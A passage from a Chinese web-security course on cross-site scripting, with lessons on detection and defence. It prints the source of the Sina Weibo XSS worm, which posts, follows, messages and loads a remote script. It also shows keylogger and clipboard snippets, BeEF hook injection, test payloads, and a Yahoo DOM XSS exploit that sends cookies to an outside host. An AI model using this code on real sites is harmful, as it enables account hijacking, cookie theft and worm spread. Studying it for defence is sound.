        <span style="color: #8b2252;">'&#24314;&#20826;&#22823;&#19994;&#20013;&#31359;&#24110;&#30340;&#22320;&#26041;&#65306;'</span>,
        <span style="color: #8b2252;">'&#35753;&#22899;&#20154;&#24515;&#21160;&#30340; 100 &#21477;&#35799;&#27468;&#65306;'</span>,
        <span style="color: #8b2252;">'3D &#32905;&#22242;&#22242;&#39640;&#28165;&#26222;&#36890;&#35805;&#29256;&#31181;&#23376;&#65306;'</span>,
        <span style="color: #8b2252;">'&#36825;&#26159;&#20256;&#35828;&#20013;&#30340;&#31070;&#20185;&#30519;&#20387;&#21834;&#65306;'</span>,
        <span style="color: #8b2252;">'&#24778;&#29190;!&#33539;&#20912;&#20912;&#33395;&#29031;&#30495;&#27969;&#20986;&#20102;&#65306;'</span>,
        <span style="color: #8b2252;">'&#26472;&#24130;&#34987;&#29190;&#22810;&#27425;&#34987;&#28508;&#35268;&#21017;:'</span>,
        <span style="color: #8b2252;">'&#20667;&#20180;&#25343;&#38180;&#23376;&#21435;&#25250;&#38134;&#34892;&#65306;'</span>,
        <span style="color: #8b2252;">'&#21487;&#20197;&#30417;&#21548;&#21035;&#20154;&#25163;&#26426;&#30340;&#36719;&#20214;&#65306;'</span>,
        <span style="color: #8b2252;">'&#20010;&#31246;&#36215;&#24449;&#28857;&#26377;&#26395;&#25552;&#21040; 4000&#65306;'</span>]; 

    //&#38543;&#26426;&#36873;&#21462;&#35805;&#39064;,&#21152;&#19978;&#20043;&#21069;&#30340;&#20256;&#25773;&#36830;&#25509;&#20316;&#20026;&#24494;&#21338;&#20869;&#23481; 
    var msg = msgs[Math.floor(Math.random()*msgs.length)] + link;
    msg = encodeURIComponent(msg); //&#23545;&#20869;&#23481;&#36827;&#34892; Url &#32534;&#30721;
    <span style="color: #a020f0;">return</span> msg;
}
// &#21033;&#29992; Ajax &#21457;&#36865; POST &#35831;&#27714;
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">post</span>(url,data,sync){
    xmlHttp = createXHR();
    xmlHttp.open(<span style="color: #8b2252;">"POST"</span>,url,sync);
    xmlHttp.setRequestHeader(<span style="color: #8b2252;">"Accept"</span>,<span style="color: #8b2252;">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>);
    xmlHttp.setRequestHeader(<span style="color: #8b2252;">"Content-Type"</span>,<span style="color: #8b2252;">"application/x-www-form-urlencoded; charset=UTF-8"</span>);
    xmlHttp.send(data);
}
// &#21457;&#34920;&#24494;&#21338;&#65292;&#35805;&#39064;&#38543;&#26426;
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">publish</span>(){
    url = <span style="color: #8b2252;">'http://weibo.com/mblog/publish.php?rnd='</span> + new Date().getTime();
    data = <span style="color: #8b2252;">'content='</span> + random_msg() + <span style="color: #8b2252;">'&amp;pic=&amp;styleid=2&amp;retcode='</span>; //&#20351;&#29992; random_msg &#29983;&#25104;&#38543;&#26426;&#35805;&#39064;
    post(url,data,true);
}
// &#33258;&#21160;&#20851;&#27880;&#29992;&#25143;
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">follow</span>(){
    url = <span style="color: #8b2252;">'http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd='</span> + new Date().getTime();
    // &#20351;&#29992;&#24403;&#21069;&#39029;&#38754;&#23384;&#20648;&#30340;$<span style="color: #a0522d;">CONFIG</span>.$<span style="color: #a0522d;">uid</span> &#26500;&#36896;&#33258;&#21160;&#20851;&#27880;&#25968;&#25454;&#21253;
    data = <span style="color: #8b2252;">'uid='</span> + 2201270010 + <span style="color: #8b2252;">'&amp;fromuid='</span> + $<span style="color: #a0522d;">CONFIG</span>.$<span style="color: #a0522d;">uid</span> + <span style="color: #8b2252;">'&amp;refer_sort=profile&amp;atnId=profile'</span>;
    post(url,data,true);
}
// &#21457;&#36865;&#31169;&#20449;
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">message</span>(){
    url = <span style="color: #8b2252;">'http://weibo.com/'</span> + $<span style="color: #a0522d;">CONFIG</span>.$<span style="color: #a0522d;">uid</span> + <span style="color: #8b2252;">'/follow'</span>; //&#26500;&#36896;&#29992;&#25143;&#20851;&#27880;&#29992;&#25143;&#21015;&#34920;&#39029; Url
    ids = getappkey(url); //&#33719;&#21462;&#34987;&#20851;&#27880;&#29992;&#25143;&#30340; Appkey &#25968;&#32452;
    id = ids.split(<span style="color: #8b2252;">'||'</span>); //&#20998;&#21106;&#20986;&#27599;&#20010;&#34987;&#20851;&#27880;&#29992;&#25143;&#30340; Appkey
    <span style="color: #a020f0;">for</span>(<span style="color: #a0522d;">i</span>=0;i&lt;id.length - 1 &amp; i&lt;5;i++){
        //&#26500;&#36896;&#31169;&#20449;&#21457;&#36865; Url
        msgurl = <span style="color: #8b2252;">'http://weibo.com/message/addmsg.php?rnd='</span> + new Date().getTime();
        msg = random_msg();
        msg = encodeURIComponent(msg);
        user = encodeURIComponent(encodeURIComponent(id[i]));
        data = <span style="color: #8b2252;">'content='</span> + msg + <span style="color: #8b2252;">'&amp;name='</span> + user + <span style="color: #8b2252;">'&amp;retcode='</span>;
        post(msgurl,data,false);  //&#36890;&#36807; XmlHttpRequest &#21457;&#36865;&#35831;&#27714;
    }
}
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">main</span>(){
    try{
        publish(); //&#27169;&#25311;&#21457;&#34920;&#24494;&#21338;
    }
    catch(e){}
    try{
        follow(); //&#27169;&#25311;&#20851;&#27880;&#29992;&#25143;
    }
    catch(e){}
    try{
        message(); //&#27169;&#25311;&#21457;&#36865;&#31169;&#20449;
    }
    catch(e){}
}
try{
    //&#22312;&#24403;&#21069; body &#23614;&#37096;&#25554;&#20837;&#23384;&#25918;&#22312;&#36828;&#31471;&#30340; Xss &#24694;&#24847;&#33050;&#26412;
   <span style="color: #a0522d;">x</span>=<span style="color: #8b2252;">"g=document.createElement('script');g.src='http://www.2kt.cn/images/t.js';document.body.appendChild(g)"</span>;window.opener.eval(x);
}
<span style="color: #0000ff;">catch</span>(e){}
<span style="color: #0000ff;">main</span>();
var <span style="color: #a0522d;">t</span>=setTimeout(<span style="color: #8b2252;">'location="http://weibo.com/pub/topic";'</span>,5000);
//&#31561;&#24453; 5 &#31186;&#36339;&#36716;&#21040;&#24494;&#35805;&#39064;&#39029;&#38754;
</pre>
</div>

<p>
我总结了该 XSS 蠕虫的攻击流程：
</p>

<ol class="org-ol">
<li>利用 XSS 漏洞插入恶意 JS 代码；</li>

<li>利用 XMLHttpRequest发送请求去发表微博、关注用户、获取关注者列表并向
其发送私信；</li>

<li>微博消息和私信都包含有恶意攻击链接，等于实现了攻击代码的自我复制和传播。</li>
</ol>

<p>
由此可见，一个完整的 XSS 蠕虫常常具备如下特征：
</p>

<ul class="org-ul">
<li>目标网站存在 XSS 漏洞；</li>

<li>攻击代码的自我复制和传播，其传播方式依赖于业务场景，更多是在社交功能
上，比如博客、私信、微博、评论。</li>
</ul>

<p>
<b>声明：在互联网上传播 XSS 蠕虫属于违法行为，即使是处于合法的渗透测试任
务，也该严格控制传播的可能性，否则出现失控，仍需承担法律责任</b> 。
</p>
</div>
</div>
<div id="outline-container-其他攻击方法" class="outline-4">
<h4 id="其他攻击方法">其他攻击方法</h4>
<div class="outline-text-4" id="text-其他攻击方法">
<p>
在 XSS 漏洞攻击场景下，凡是 JavaScript
能够实现功能，你都可以自由发挥，实现不同的攻击方法。
</p>

<p>
比如键盘记录：
</p>

<div class="org-src-container">
<pre class="src src-lang-javascript">keys = ""
document.onkeypress = function(){
  keys += String.fromCharCode(window.event.keyCode);
}
</pre>
</div>

<p>
比如在 Chrome 浏览器中使用代码截获剪贴板内容：
</p>

<div class="org-src-container">
<pre class="src src-lang-javascript">document.addEventListener('paste', function (evt) {
  clipdata = evt.clipboardData || window.clipboardData;
  console.log(clipdata.getData('text/plain'));
});
</pre>
</div>


<figure id="orgcc15b2b">
<img src="./images/CgqCHl_cOwOAbfppAATnMiQk45A089.png" alt="CgqCHl_cOwOAbfppAATnMiQk45A089.png" width="80%">

</figure>

<p>
图 23：截获剪贴内容
</p>

<p>
比如钓鱼欺骗用户输入账号、密码：
</p>


<figure id="org21b3090">
<img src="./images/Cip5yF_kTF-ALwT6AALUte7Tb1k341.png" alt="Cip5yF_kTF-ALwT6AALUte7Tb1k341.png" width="80%">

</figure>

<p>
图 24：利用 XSS 进行钓鱼欺骗
</p>

<p>
方法还有很多，因篇幅有限，这里不再赘述，你可以参考下面讲到的 XSS
攻击框架 BeEF，它在工具上集成了很多 XSS 攻击方式，可直接使用。
</p>
</div>
</div>
<div id="outline-container-beef" class="outline-4">
<h4 id="beef">BeEF</h4>
<div class="outline-text-4" id="text-beef">
<p>
这里我要介绍一款非常著名的 XSS 攻击框架<a href="https://beefproject.com/">BeEF</a>，它支持 Docker 快速安装，
可以从GitHub 下载然后编译安装：
</p>

<div class="org-src-container">
<pre class="src src-lang-shell">$ git clone https://github.com/beefproject/beef
$ cd beef
$ sudo docker build -t beef .
$ sudo docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 --name beef beef
</pre>
</div>

<p>
运行成功后，你会得到一个 hook.js 地址，这是利用 XSS漏洞插入目标网站的
攻击脚本地址。
</p>


<figure id="orge248eb0">
<img src="./images/CgqCHl_cOyKADDkjAAC98rkZQJg985.png" alt="CgqCHl_cOyKADDkjAAC98rkZQJg985.png" width="80%">

</figure>

<p>
图 25：返回 hook.js 和管理界面地址
</p>

<p>
我本地得到地址是：<a href="http://127.0.0.1:3000/hook.js">http://127.0.0.1:3000/hook.js</a>（实际攻击时，可将
127.0.0.1替换成你的远程服务器地址），那我就可以在漏洞页面插入如下代码
进行利用：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">&lt;script&gt;http://127.0.0.1:3000/hook.js&lt;/script&gt;
</pre>
</div>

<p>
受害者访问后，若利用成功的话，在 BeEF 管理页面（此处为
<a href="http://127.0.0.1:3000/ui/panel">http://127.0.0.1:3000/ui/panel</a>）就可以看到目标上线了。
</p>


<figure id="orgeab43d2">
<img src="./images/Ciqc1F_cOymAFUlLAAJ8WDrvvw8214.png" alt="Ciqc1F_cOymAFUlLAAJ8WDrvvw8214.png" width="80%">

</figure>

<p>
图 26：BeEF 漏洞利用框架
</p>

<p>
刚运行的时候，BeEF 会生成随机密码，账号为 beef，比如：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">Beef credentials: beef:aaGivbkemeYNtCYRFrlyQN75lcmMYMm5
</pre>
</div>

<p>
用上面的账号密码登录即可；你也可以修改 config.yaml 中的账号密码再运行。
</p>

<p>
BeEF上面的利用功能实在是太多了，你可以把每个功能都试用一下，相信你试用
完之后会对XSS 的危害和利用手法有新的认识。
</p>
</div>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
最后，我对这一讲的内容做个总结。
</p>

<p>
首先，我介绍了 XSS 的起源以及危害，然后讲解了反射型、存储型和 DOM 型
XSS的原理，并从代码层面分析了漏洞成因。随后我介绍了各种常见的 XSS攻击
手法，结合实例分析了 Cookie窃取和蠕虫攻击的具体实现，帮助你进一步了解
XSS 的危害。
</p>

<p>
BeEF 是一款优秀的 XSS 攻击框架，包含有非常丰富的 XSS漏洞利用功能，如果
你想深入学习 XSS 的攻击手段，从 BeEF入手是不错的选择。BeEF 已经在
GitHub 开源，主要是采用 JavaScript 和 Ruby开发，你可以重点研究下漏洞利
用中的 JavaScript 代码，即 hook.js 文件。
</p>

<p>
如果你有什么好的 BeEF 利用技巧，或者是其他优秀的 XSS利用工具，欢迎你在
留言区留言推荐。
</p>

<p>
下一讲，我将介绍如何挖掘三大类型的 XSS 漏洞以及如何防御，到时见~
</p>


<figure id="org27e1df7">
<img src="./images/CgpVE1_kTHSAL9KqAAUNAGwX_GM335.png" alt="CgpVE1_kTHSAL9KqAAUNAGwX_GM335.png" width="80%">

</figure>
</div>
</div>
</section>
<section id="outline-container-h:36d2a6d6-a98c-4eef-9507-1ca7bca5ca02" class="outline-2">
<h2 id="h:36d2a6d6-a98c-4eef-9507-1ca7bca5ca02">XSS：漏洞的检测与防御</h2>
<div class="outline-text-2" id="text-h:36d2a6d6-a98c-4eef-9507-1ca7bca5ca02">
<p>
你好，我是赢少良。上一讲我介绍了反射型 XSS、存储型 XSS 和 DOM 型 XSS的
原理，以及常见的漏洞攻击手法。这一讲我们就来学习下如何挖掘 XSS漏洞，又
如何防御 XSS 漏洞。
</p>

<p>
目前 Flash 已经被各大浏览器禁用，Adobe 官方也不再更新 Flash 相关产品。
HTML5 技术已经基本替换掉 Flash，因此不再介绍 Flash 相关的漏洞。
</p>
</div>
<div id="outline-container-xss-漏洞挖掘" class="outline-3">
<h3 id="xss-漏洞挖掘">XSS 漏洞挖掘</h3>
<div class="outline-text-3" id="text-xss-漏洞挖掘">
<p>
XSS 漏洞挖掘的方法可以按有无源码的情况分为黑盒测试和白盒测试。
</p>

<p>
<b>黑盒测试</b> 主要是通过发送特意构造攻击字符串来验证漏洞，比如 &lt;script&gt;
alert(1)&lt;/script&gt;。请求后看是否会弹框，若会则代表存在XSS，反之则不存在。
</p>

<p>
<b>白盒测试</b> 是通过分析源代码来检测 XSS漏洞，根据不同的编程语言采取不同
的词法、语法分析方式，然后通过污点分析（追踪用户的输入数据是否达到特定
的漏洞触发函数）的思路来检测漏洞。
</p>

<p>
我们来具体了解一下这两种方法。
</p>
</div>
<div id="outline-container-黑盒测试" class="outline-4">
<h4 id="黑盒测试">黑盒测试</h4>
<div class="outline-text-4" id="text-黑盒测试">
<p>
对于测试人员，多数情况下是没有目标网站的源码，对这种无源码的网站测试，
我们称为黑盒测试。下面我会从人工测试和工具自动测试两方面来讲解一些常用
的黑盒测试技术。
</p>

<p>
<b>人工测试</b>
</p>

<p>
人工测试的主要思路就是在一切可输入数据的地方输入“XSS payload”（测试
用例），这些地方包括所有的 GET、POST、Cookie、HTTP头。提交数据之后，看
网站的输出是否解析了前面输入的 XSS payload。
</p>

<p>
我常用的 XSS payload 有以下几个。搜索“XSS cheat sheet”，也可以找到很
多这种测试用例。
</p>

<ul class="org-ul">
<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Cross-site scripting (XSS) cheat sheet</a></li>

<li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">XSS Filter Evasion Cheat Sheet</a></li>

<li><a href="http://html5sec.org/">HTML5 Security Cheatsheet</a></li>
</ul>

<p>
平时测试时，我喜欢先将上面的 XSS payload 整理放在一个 txt文件中，然后
用数字区分每个用例，比如：
</p>

<div class="org-src-container">
<pre class="src src-lang-javascript">&lt;XSS id=x tabindex=1 onactivate=alert(1)&gt;&lt;/XSS&gt;
&lt;body onafterprint=alert(2)&gt;
&lt;XSS onafterscriptexecute=alert(3)&gt;&lt;script&gt;1&lt;/script&gt;
&lt;body onbeforeprint=alert(4)&gt;
&lt;svg&gt;&lt;animate onbegin=alert(5) attributeName=x dur=1s&gt;
……
</pre>
</div>

<p>
然后将其一次性全复制进输入框中测试，看提交后有没有弹框，若弹框了，通过
对应数字就能知道是哪个测试用例被成功执行了。有时输入长度有限制，就只能
一个个测试，然后根据响应内容做一些调整。
</p>

<p>
上面这种测试方法相对暴力一些，有时网站有自己的一些数据处理逻辑（过滤、
编码、输入类型判断等等），这时就需要一些探测性的输入，比如输入以下字符
串：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">"'&lt;script&gt;;&amp;#,/=(12345)
</pre>
</div>

<p>
在返回页面的源码中搜索 12345的输出位置，以及上面这些特殊字符的过滤情况。
</p>

<p>
以 DVWA 靶场中的 XSS（Reflected）题目为例。在 DVWA Security 中安全等级
为High，如下图所示：
</p>


<figure id="orgdb5d249">
<img src="./images/CgpVE1_gOVSAXGS3AAFuAZ0WAc8505.png" alt="CgpVE1_gOVSAXGS3AAFuAZ0WAc8505.png" width="80%">

</figure>

<p>
图 1：设置 DVWA 安全等级为“High”
</p>

<p>
先在题目中输入前面那串测试字符串去探测下：
</p>


<figure id="orgee0ed36">
<img src="./images/CgpVE1_gOWGAUjfjAAA_jQElj0I731.png" alt="CgpVE1_gOWGAUjfjAAA_jQElj0I731.png" width="80%">

</figure>

<p>
图 2：输入测试字符串
</p>

<p>
在网页中右击菜单，选择“检查”查看源码，直接搜索“12345”，可以看到数据的输出位置：
</p>


<figure id="org3f8b825">
<img src="./images/CgpVE1_gOWmABQ9EAADPA1r9pjM688.png" alt="CgpVE1_gOWmABQ9EAADPA1r9pjM688.png" width="80%">

</figure>

<p>
图 3：查看源码定位输出位置
</p>

<p>
可以发现，输出位置在=&lt;pre&gt;=标签内，并且过滤掉了“&lt;script”（不包括引
号）。尝试输入以下字符串看是否会有转机：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">"'&lt;scr&lt;scriptipt&gt;;&amp;#,/=(12345)
</pre>
</div>

<p>
结果发现还是没用：
</p>


<figure id="org6fbc8e0">
<img src="./images/CgpVE1_gOhSAFncFAAD54yWg-JA197.png" alt="CgpVE1_gOhSAFncFAAD54yWg-JA197.png" width="80%">

</figure>

<p>
图 4：更改测试字符串
</p>

<p>
既然没法用 <code>&lt;script&gt;</code> 标签，我们就换个其他的标签试下。如果你不熟悉测试
用例，可以回头翻看下前面介绍的XSS cheat sheet。这里我改用了 <code>&lt;img&gt;</code> 标
签（下面的数字一样都是为了方便搜索源码）：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">&lt;img&gt;12345
</pre>
</div>


<figure id="org2ab4b99">
<img src="./images/CgqCHl_gO6yAc_s3AAGcJQYwIUQ445.png" alt="CgqCHl_gO6yAc_s3AAGcJQYwIUQ445.png" width="80%">

</figure>

<p>
图 5：测试&lt; img &gt;标签
</p>

<p>
可以看到， <code>&lt;img&gt;</code> 被解析了。前面我们已经测试过，各种特殊字符也没过滤。
这样我们就可以构造完整的测试用例试下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">&lt;img src=a onerror=alert(1)&gt;
</pre>
</div>

<p>
成功弹出提示框：
</p>


<figure id="org8f21c9f">
<img src="./images/CgpVE1_gO76AVkj9AAAzp-O1rbU774.png" alt="CgpVE1_gO76AVkj9AAAzp-O1rbU774.png" width="80%">

</figure>

<p>
图 6：成功利用&lt; img&gt;标签执行任意 JS 代码
</p>

<p>
返回数据如下，输入数据都被完整地解析执行。
</p>


<figure id="orgec82270">
<img src="./images/Cip5yF_gO8WAeDzJAAAT9ObloPA103.png" alt="Cip5yF_gO8WAeDzJAAAT9ObloPA103.png" width="80%">

</figure>

<p>
图 7：被解析的代码
</p>

<p>
这里我总结一下人工测试思路：日常收集一些 XSS cheat sheet，然后编号整理
出来，用于日常测试用例；你可以先一次性批量输入测试，如果无效，再输入一
些特殊字符看过滤情况，根据返回数据作相应的调整测试。
</p>

<p>
除了一些比较深的操作入口，并且涉及一些前置的操作条件（比如验证码、开启
特定设置之类的），不然多数情况下，整个过程其实可以通过自动化工具实现。
</p>

<p>
<b>工具自动化测试</b>
</p>

<p>
在《01 |武器库：常用的渗透测试工具》中我介绍了一些常用的渗透测试工具，
里面有支持XSS 扫描的工具，比如 AWVS、Xray、Goby 这类综合型扫描器。
</p>

<p>
这里我推荐一款专门针对 XSS漏洞扫描的开源工具，<a href="https://github.com/s0md3v/XSStrike">XSStrike</a>，它在业内也是有
一定名气的。由于开源，非常有利于自己添加XSS payload，或者做二次开发。
</p>

<p>
XSStrike 支持很多功能，比如 DOM XSS扫描（基于正则扫描敏感函数，存在一
定误报）、WAF检测与绕过、爬虫、HTML＆JS 动态解析引擎验证。常用的测试命
令如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">爬虫整个网站进行 XSS 扫描：
python3 XSStrike.py -u "http://testphp.vulnweb.com/" --crawl
针对单个 URL 进行扫描：
python3 XSStrike.py -u "http://localhost/vulnerabilities/XSS_r/?name=a"
</pre>
</div>

<p>
以 AWVS 的在线靶场为例，它可以检测搜索框存在的 XSS 漏洞：
</p>


<figure id="org04824da">
<img src="./images/CgqCHl_gO9mAdRs_AABsm8OWsbs654.png" alt="CgqCHl_gO9mAdRs_AABsm8OWsbs654.png" width="80%">

</figure>

<p>
图 8：XSStrike
</p>

<p>
XSStrike 功能比较全面，但也会存在误报，而且告警结果展示的体验不是很好。
</p>

<p>
因此，这里再推荐另一款工具，叫<a href="https://github.com/lwzSoviet/NoXss">NoXSS</a>。它的特点就是批量扫描速度快，而且
告警展示效果比XSStrike 好，但漏洞检测能力不如XSStrike，你可以把这两款
搭配着使用。NoXSS的使用方法也很简单，常用命令如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">python start.py --url="http://localhost/vulnerabilities/XSS_r/?name=a"
</pre>
</div>


<figure id="orgaa1f29b">
<img src="./images/Ciqc1F_gO-SAWQl0AAbouv6er5w361.png" alt="Ciqc1F_gO-SAWQl0AAbouv6er5w361.png" width="80%">

</figure>

<p>
图 9：NoXSS
</p>

<p>
DOM XSS 的扫描相比常规 XSS 要难一些，主要是针对 JS代码的分析，如果只是
简单的正则匹配，就很容易误报漏报。所以针对 DOM XSS的检测，除了常规的
XSS payload暴力测试、正则匹配检测代码外，还可以基于以下几种常见方法来
检测 XSS。
</p>

<ul class="org-ul">
<li>Headless Chrome：利用无界面 Chrome 浏览器来检测XSS，参考《<a href="https://paper.seebug.org/641/">基于 Chrome-headless 的XSS 检测</a>》，这是目前主流的动态检测方法。</li>

<li>QtWebKit：参考《<a href="https://security.tencent.com/index.php/blog/msg/12">基于QtWebKit 的 DOM XSS 检测技术</a>》，QtWebKit 作者已
停止维护。</li>

<li>PhantomJS：已停止维护。它提供一套基于 WebKit 的服务器端 JavaScript
API，可以在无浏览器支持的情况下实现 Web 浏览器功能的支持，例如 DOM处
理、JavaScript、CSS 选择器、JSON、Canvas 和可缩放矢量图形 SVG等功能。</li>
</ul>

<p>
这些方法可以实现动态解析 JS，以验证特意构造的 XSS payload是否被执行，
从而准确地判断是否存在 XSS 漏洞。
</p>

<p>
这种动态检测 DOM XSS 的工具，个人特别推荐 Dominator。它是基于 Firefox
改造的，在一些关键的输入输出函数添加Hook，如果发现有用户可控数据输出到
一些 sink漏洞触发函数上就会告警。它的特点是发现率高，虽然也有不少误报。
此前我用它发现了不少国内知名网站的DOM XSS，有些不同域名的网站引用到同
一个漏洞 JS文件，导致一个漏洞影响一大批网站。
</p>

<p>
以之前一些 Yahoo DOM XSS 为例，当你用 Dominator访问了存在漏洞的页面后，
可以看到其输出的告警内容如下：
</p>


<figure id="orgc4af7c4">
<img src="./images/CgqCHl_gO_CARQ8zAARc2hmr8mY249.png" alt="CgqCHl_gO_CARQ8zAARc2hmr8mY249.png" width="80%">

</figure>

<p>
图 10：用 Dominator 检测 DOM XSS
</p>

<p>
提示 windows.name 输入数据被直接传递给 eval 函数，也就是说如果你能控制
windows.name 的值，就可以实现任意 JS代码的执行。利用起来也非常简单，我
们可以看下漏洞发现者 Abysssec公司发布的利用代码：
</p>

<div class="org-src-container">
<pre class="src src-lang-javascript">&lt;html&gt;
&lt;script&gt;
window.name=' new Image().src="http://abysssec.com/log/log.php?cookie="+encodeURI(document.cookie);
setTimeout(\"location.href = \'http:\/\/www.yahoo.com\';\",10);';
location.href="http://adspecs.yahoo.com/index.php";
&lt;/script&gt;
&lt;/html&gt;
</pre>
</div>

<p>
利用思路就是直接设置 window.name 参数，插入打算执行的 JS 代码，然后用
location.href跳转到漏洞页面去触发。这类漏洞我在网易的一些网站上也发现
了不少，也是用Dominator 挖掘到的，所以个人比较推荐。
</p>
</div>
</div>
<div id="outline-container-白盒测试" class="outline-4">
<h4 id="白盒测试">白盒测试</h4>
<div class="outline-text-4" id="text-白盒测试">
<p>
如果我们有网站源码，就可以直接通过分析源码来挖掘漏洞。网站开发语言非常
多，JavaScript、PHP、Python、Go、C/C++等等都可以用来开发网站的前端和后
端。不同的语言有不同的特性，在源码审计时需要采取不同的检测点，但有一个
共同的思路，那就是*污点分析的检测思路*。
</p>

<p>
前面我已经简单地提到污点分析原理就是检测用户可控的输入数据，污点也就是
用户可控的输入数据。然后我们去追踪污点的传播过程，检测是否传递给危险的
输出函数。对于XSS 就是能够控制页面内容或者执行 JS 的输出函数有 echo、
eval等。
</p>

<p>
有时我们也会反着来：先查看一些危险的输出函数，再回溯它的参数传递，判断
是否有未经过滤的用户输入数据，若有就代表可能存在漏洞。其他漏洞类型，以
及其他编程语言的代码审计方式都是相通的，只是有不同的sinks 和过滤函数需
要作为检测点。
</p>


<figure id="orgf3afc9c">
<img src="./images/Ciqc1F_pfG2AJevWAAGvhSxGKxk804.png" alt="Ciqc1F_pfG2AJevWAAGvhSxGKxk804.png" width="80%">

</figure>

<p>
图 11：污点分析流程
</p>

<p>
以 PHP 源码审计为例，常见的污点 source 有以下这些：
</p>


<figure id="orge05761b">
<img src="./images/Ciqc1F_pfHaAfNXbAADXUYehbs4744.png" alt="Ciqc1F_pfHaAfNXbAADXUYehbs4744.png" width="80%">

</figure>

<p>
关于 XSS 常见的污点触发位置 sink 有以下这些：
</p>


<figure id="org68092fe">
<img src="./images/CgqCHl_pfH-AN_QGAAE9xCbnNNc546.png" alt="CgqCHl_pfH-AN_QGAAE9xCbnNNc546.png" width="80%">

</figure>

<p>
我在审计代码时，习惯使用 VSCode 和Sublime，你可以根据自己的喜好选择一
款合适的代码阅读软件，然后批量搜索文件中的sink 位置，再往上回溯追踪是
否有引入 source污染数据；若引入了，有没有做好过滤转义等安全工作。
</p>

<p>
关于 DOM XSS 的审计，主要是针对 JS 代码的审计，关于它的 srouces &amp;
sinks，我已在《 <b>04｜XSS：劫持身份的惯犯</b> 》的图 14中给出，此处不再赘述；
你也可以按照污点分析的思路去做 JS 代码审计。
</p>

<p>
主流的自动化源码审计工具有 RIPS、Coverity、CheckMarx等等，都是一些商业
软件。近两年也有一些优秀的开源项目贡献，比如<a href="https://github.com/LoRexxar/Kunlun-M">Kunlun-M</a>，目前作者仍在更新
维护中。如果你或者你所在的公司没有条件采购商业软件，这也是一个不错的选
择。
</p>
</div>
</div>
</div>
<div id="outline-container-防御-xss-攻击" class="outline-3">
<h3 id="防御-xss-攻击">防御 XSS 攻击</h3>
<div class="outline-text-3" id="text-防御-xss-攻击">
<p>
以前在面试一些同学时，问他们怎么修复XSS，都会说做好过滤，但具体怎么做
过滤，很多都答不上来。有的会简单说下做HTML 实体化编码，比如用
htmlspecialchars 函数，但其实这是错误的。XSS的防御必须根据不同的触发位
置采取不同的防御方案，下面我们来详细了解一下。
</p>
</div>
<div id="outline-container-输入检查" class="outline-4">
<h4 id="输入检查">输入检查</h4>
<div class="outline-text-4" id="text-输入检查">
<p>
在测试 XSS时，经常需要输入一些特殊字符，所以在一开始直接做好输入检查有
利于减少攻击的可能性。我在协助业务修复漏洞的时候，经常推荐的方法就是白
名单限制，比如参数是个整数值，那直接限制死即可，若不符合就抛异常。不要
单纯只想着过滤替换特殊字符，这很容易就被绕过了。
</p>

<p>
如果白名单范围不好确定，我就会采用黑名单的方式，把常用的 XSS payload特
殊字符或字符串做检测，比如 <code>&lt;script&gt;</code> 、javascript:、&lt;、&gt;、'、"、&amp;、#。
但是黑名单这种方式，有时结合业务场景，以及浏览器特性，就有可能找到绕过
方法。
</p>

<p>
还有一定不要单纯只在客户端上做过滤，还要结合服务端做限制。若只是客户端
上做过滤，那么抓包后修改数据重发就绕过了。
</p>
</div>
</div>
<div id="outline-container-输出检查" class="outline-4">
<h4 id="输出检查">输出检查</h4>
<div class="outline-text-4" id="text-输出检查">
<p>
跨站漏洞的触发关键点就在于 <b>输出的位置</b> ，所以对输出进行检查尤为重要。
</p>

<p>
以前百度 Hi 空间有个 XSS 漏洞，官方后来虽然修复了， 但发现者的百度 Hi
空间仍存在 XSS 弹框。这正是因为官方的修复方案中只做了输入检查，没有过
输出检查，导致以前曾被利用过的XSS payload 仍然有效。如果在官方修复前，
那个 XSS 漏洞已经被恶意利用了，那即使已经通过输入检查方法修复了，被插
入的恶意代码仍会存在，这可以认为是修复不彻底的表现。
</p>

<p>
有时网站需要支持富文本（用户自定义的 HTML代码），比如为方便用户而保留
的 <code>&lt;a&gt;</code> 链接标签，此时采用白名单的方式，直接限制允许输入的标签、字符
是最佳方案。
</p>

<p>
那我们应该如何根据不同的位置采取不同的 XSS防御方案呢？我整理了一份表格
（由于 DOM XSS情况特殊，我会单独用一个小节来介绍）。
</p>


<figure id="org278dfc8">
<img src="./images/Cip5yF_pfJKAUVygAASq2AlxRQQ453.png" alt="Cip5yF_pfJKAUVygAASq2AlxRQQ453.png" width="80%">

</figure>
</div>
</div>
<div id="outline-container-防御-dom-xss" class="outline-4">
<h4 id="防御-dom-xss">防御 DOM XSS</h4>
<div class="outline-text-4" id="text-防御-dom-xss">
<p>
DOM XSS 是一种特殊的 XSS类型，前面介绍的一些防御方法并不那么通用，需要
根据输出位置做不同的防御方法。同样的，我整理了一份DOM XSS 防御方案表格，
供你参考。
</p>


<figure id="org82b2c35">
<img src="./images/CgpVE1_pfJ-AHUeqAAVEa4jRM4U161.png" alt="CgpVE1_pfJ-AHUeqAAVEa4jRM4U161.png" width="80%">

</figure>
</div>
</div>
<div id="outline-container-httponly-cookie" class="outline-4">
<h4 id="httponly-cookie">Httponly Cookie</h4>
<div class="outline-text-4" id="text-httponly-cookie">
<p>
如果你在 Cookie 中设置了 HttpOnly 属性，那 JavaScript 脚本将无法读取到
Cookie，这样就能防止通过 XSS 窃取 Cookie，在一定程度上能够减少 XSS的攻
击范围。
</p>

<p>
用 EditThisCookie 插件看下拉勾网的 Cookie，可以发现其中 JSESSIONID就开
启 HttpOnly。
</p>


<figure id="orgebe5d59">
